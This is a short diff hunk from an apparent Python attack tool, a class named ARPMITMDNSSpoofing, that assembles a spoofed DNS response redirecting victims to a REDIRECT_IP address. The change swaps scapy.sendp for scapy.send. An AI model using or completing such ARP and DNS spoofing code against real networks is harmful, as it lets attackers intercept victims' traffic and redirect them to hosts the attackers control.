@@ -107,7 +107,7 @@ class ARPMITMDNSSpoofing():
                                                 rdata = REDIRECT_IP))
 
                 packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
-        scapy.sendp(packet)
+        scapy.send(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
